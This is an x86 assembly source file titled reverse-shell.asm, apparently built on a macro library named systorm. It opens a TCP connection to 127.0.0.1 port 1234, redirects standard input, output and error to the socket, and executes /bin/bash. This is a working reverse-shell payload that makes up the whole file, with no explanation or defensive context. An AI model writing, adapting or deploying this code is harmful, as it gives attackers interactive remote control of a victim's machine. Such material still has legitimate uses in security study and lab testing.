; reverse-shell.asm

[BITS 32]

%include "systorm.inc"

global _start
_start:
    thread.fork main
    jmp exit

use sock.socket, sock.connect, thread.fork

main:
    stackframe 4

    sock.socket AF_INET, SOCK_STREAM
    mov dword [ebp-4], eax
    sock.connect dword [ebp-4], AF_INET, 0x0101017F, 0xD204	; 127.0.0.1, 1234
    mov ecx, 2
.dup_loop:
    sys.dup2 [ebp-4], ecx
    dec ecx
    jns .dup_loop
exec:
    inline '/bin/bash', 0
    sys.execve eax, 0, 0
exit:
    sys.exit 0